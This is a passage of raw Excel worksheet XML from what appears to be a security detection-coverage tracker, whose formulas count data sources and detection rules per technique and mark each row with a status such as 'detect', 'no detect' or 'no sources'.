      <c r="P169" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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69" t="s">
        <v>368</v>
      </c>
      <c r="U169" t="s">
        <v>1054</v>
      </c>
      <c r="V169" t="s">
        <v>1055</v>
      </c>
      <c r="W169" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="170" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A170" t="s">
        <v>1056</v>
      </c>
      <c r="B170" t="s">
        <v>1056</v>
      </c>
      <c r="C170" t="s">
        <v>149</v>
      </c>
      <c r="D170" t="s">
        <v>11</v>
      </c>
      <c r="E170" t="s">
        <v>940</v>
      </c>
      <c r="F170" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G170" s="9" cm="1">
        <f t="array" ref="G170">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H170" s="9" cm="1">
        <f t="array" ref="H170">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I170" s="9" t="str" cm="1">
        <f t="array" ref="I170">IF(SUM(IF($C170=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C170=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J170" s="9" t="str" cm="1">
        <f t="array" ref="J17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70" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M170" s="9" cm="1">
        <f t="array" ref="M170">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N170" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O170" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P170" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S17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70" t="s">
        <v>425</v>
      </c>
      <c r="U170" t="s">
        <v>1057</v>
      </c>
      <c r="V170" t="s">
        <v>1058</v>
      </c>
      <c r="W170" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="171" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A171" t="s">
        <v>1059</v>
      </c>
      <c r="B171" t="s">
        <v>1059</v>
      </c>
      <c r="C171" t="s">
        <v>18</v>
      </c>
      <c r="D171" t="s">
        <v>646</v>
      </c>
      <c r="E171" t="s">
        <v>1060</v>
      </c>
      <c r="F171" s="9">
        <f t="shared" si="2"/>
        <v>6</v>
      </c>
      <c r="G171" s="9" cm="1">
        <f t="array" ref="G171">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H171" s="9" cm="1">
        <f t="array" ref="H171">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>7</v>
      </c>
      <c r="I171" s="9" t="str" cm="1">
        <f t="array" ref="I171">IF(SUM(IF($C171=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C171=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J171" s="9" cm="1">
        <f t="array" ref="J17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171" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>7</v>
      </c>
      <c r="M171" s="9" cm="1">
        <f t="array" ref="M171">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>7</v>
      </c>
      <c r="N171" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O171" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P171" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S17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71" t="s">
        <v>979</v>
      </c>
      <c r="U171" t="s">
        <v>1061</v>
      </c>
      <c r="V171" t="s">
        <v>1062</v>
      </c>
      <c r="W171" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="172" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A172" t="s">
        <v>1059</v>
      </c>
      <c r="B172" t="s">
        <v>1063</v>
      </c>
      <c r="C172" t="s">
        <v>240</v>
      </c>
      <c r="D172" t="s">
        <v>646</v>
      </c>
      <c r="E172" t="s">
        <v>1064</v>
      </c>
      <c r="F172" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G172" s="9" cm="1">
        <f t="array" ref="G172">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H172" s="9" t="str" cm="1">
        <f t="array" ref="H172">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I172" s="9" t="str" cm="1">
        <f t="array" ref="I172">IF(SUM(IF($C172=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C172=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J172" s="9" t="str" cm="1">
        <f t="array" ref="J17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72" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M172" s="9" cm="1">
        <f t="array" ref="M172">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N172" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O172" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P172" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S17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72" t="s">
        <v>1065</v>
      </c>
      <c r="U172" t="s">
        <v>1066</v>
      </c>
      <c r="V172" t="s">
        <v>1067</v>
      </c>
      <c r="W172" t="b">
        <v>1</v>
      </c>
      <c r="X172" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="173" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A173" t="s">
        <v>1059</v>
      </c>
      <c r="B173" t="s">
        <v>1068</v>
      </c>
      <c r="C173" t="s">
        <v>301</v>
      </c>
      <c r="D173" t="s">
        <v>646</v>
      </c>
      <c r="E173" t="s">
        <v>1069</v>
      </c>
      <c r="F173" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G173" s="9" cm="1">
        <f t="array" ref="G173">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H173" s="9" t="str" cm="1">
        <f t="array" ref="H173">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I173" s="9" t="str" cm="1">
        <f t="array" ref="I173">IF(SUM(IF($C173=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C173=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J173" s="9" t="str" cm="1">
        <f t="array" ref="J17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73" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M173" s="9" cm="1">
        <f t="array" ref="M173">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N173" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O173" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P173" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S17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73" t="s">
        <v>1023</v>
      </c>
      <c r="U173" t="s">
        <v>1070</v>
      </c>
      <c r="V173" t="s">
        <v>1071</v>
      </c>
      <c r="W173" t="b">
        <v>1</v>
      </c>
      <c r="X173" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="174" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A174" t="s">
        <v>1059</v>
      </c>
      <c r="B174" t="s">
        <v>1072</v>
      </c>
      <c r="C174" t="s">
        <v>238</v>
      </c>
      <c r="D174" t="s">
        <v>646</v>
      </c>
      <c r="E174" t="s">
        <v>1073</v>
      </c>
      <c r="F174" s="9">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="G174" s="9" cm="1">
        <f t="array" ref="G174">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H174" s="9" t="str" cm="1">
        <f t="array" ref="H174">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I174" s="9" t="str" cm="1">
        <f t="array" ref="I174">IF(SUM(IF($C174=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C174=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J174" s="9" t="str" cm="1">
        <f t="array" ref="J17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74" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M174" s="9" cm="1">
        <f t="array" ref="M174">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N174" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O174" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P174" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S17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74" t="s">
        <v>517</v>
      </c>
      <c r="U174" t="s">
        <v>1074</v>
      </c>
      <c r="V174" t="s">
        <v>1075</v>
      </c>
      <c r="W174" t="b">
        <v>1</v>
      </c>
      <c r="X174" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="175" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A175" t="s">
        <v>1059</v>
      </c>
      <c r="B175" t="s">
        <v>1076</v>
      </c>
      <c r="C175" t="s">
        <v>1077</v>
      </c>
      <c r="D175" t="s">
        <v>646</v>
      </c>
      <c r="E175" t="s">
        <v>1078</v>
      </c>
      <c r="F175" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G175" s="9" cm="1">
        <f t="array" ref="G175">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H175" s="9" t="str" cm="1">
        <f t="array" ref="H175">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I175" s="9" t="str" cm="1">
        <f t="array" ref="I175">IF(SUM(IF($C175=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C175=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J175" s="9" t="str" cm="1">
        <f t="array" ref="J17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75" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M175" s="9" cm="1">
        <f t="array" ref="M175">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N175" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O175" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P175" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S17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75" t="s">
        <v>1079</v>
      </c>
      <c r="U175" t="s">
        <v>1080</v>
      </c>
      <c r="V175" t="s">
        <v>1081</v>
      </c>
      <c r="W175" t="b">
        <v>1</v>
      </c>
      <c r="X175" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="176" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A176" t="s">
        <v>1059</v>
      </c>
      <c r="B176" t="s">
        <v>1082</v>
      </c>
      <c r="C176" t="s">
        <v>278</v>
      </c>
      <c r="D176" t="s">
        <v>646</v>
      </c>
      <c r="E176" t="s">
        <v>1083</v>
      </c>
      <c r="F176" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G176" s="9" cm="1">
        <f t="array" ref="G176">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H176" s="9" t="str" cm="1">
        <f t="array" ref="H176">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I176" s="9" t="str" cm="1">
        <f t="array" ref="I176">IF(SUM(IF($C176=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C176=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J176" s="9" t="str" cm="1">
        <f t="array" ref="J17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76" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M176" s="9" cm="1">
        <f t="array" ref="M176">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N176" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O176" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P176" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S17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76" t="s">
        <v>1084</v>
      </c>
      <c r="U176" t="s">
        <v>1085</v>
      </c>
      <c r="W176" t="b">
        <v>1</v>
      </c>
      <c r="X176" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="177" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A177" t="s">
        <v>1059</v>
      </c>
      <c r="B177" t="s">
        <v>1086</v>
      </c>
      <c r="C177" t="s">
        <v>1087</v>
      </c>
      <c r="D177" t="s">
        <v>646</v>
      </c>
      <c r="E177" t="s">
        <v>1073</v>
      </c>
      <c r="F177" s="9">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="G177" s="9" cm="1">
        <f t="array" ref="G177">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H177" s="9" t="str" cm="1">
        <f t="array" ref="H177">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I177" s="9" t="str" cm="1">
        <f t="array" ref="I177">IF(SUM(IF($C177=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C177=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J177" s="9" t="str" cm="1">
        <f t="array" ref="J17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77" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M177" s="9" cm="1">
        <f t="array" ref="M177">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N177" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O177" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P177" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S17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77" t="s">
        <v>743</v>
      </c>
      <c r="U177" t="s">
        <v>1088</v>
      </c>
      <c r="W177" t="b">
        <v>1</v>
      </c>
      <c r="X177" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="178" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A178" t="s">
        <v>1059</v>
      </c>
      <c r="B178" t="s">
        <v>1089</v>
      </c>
      <c r="C178" t="s">
        <v>1090</v>
      </c>
      <c r="D178" t="s">
        <v>646</v>
      </c>
      <c r="E178" t="s">
        <v>1073</v>
      </c>
      <c r="F178" s="9">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="G178" s="9" cm="1">
        <f t="array" ref="G178">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H178" s="9" t="str" cm="1">
        <f t="array" ref="H178">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I178" s="9" t="str" cm="1">
        <f t="array" ref="I178">IF(SUM(IF($C178=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C178=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J178" s="9" t="str" cm="1">
        <f t="array" ref="J17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78" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M178" s="9" cm="1">
        <f t="array" ref="M178">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N178" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O178" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P178" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S17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78" t="s">
        <v>368</v>
      </c>
      <c r="U178" t="s">
        <v>1091</v>
      </c>
      <c r="W178" t="b">
        <v>1</v>
      </c>
      <c r="X178" t="s">
        <v>1059</v>
      </c>
    </row>
    <row r="179" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A179" t="s">
        <v>1092</v>
      </c>
      <c r="B179" t="s">
        <v>1092</v>
      </c>
      <c r="C179" t="s">
        <v>183</v>
      </c>
      <c r="D179" t="s">
        <v>11</v>
      </c>
      <c r="E179" t="s">
        <v>1029</v>
      </c>
      <c r="F179" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G179" s="9" cm="1">
        <f t="array" ref="G179">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H179" s="9" cm="1">
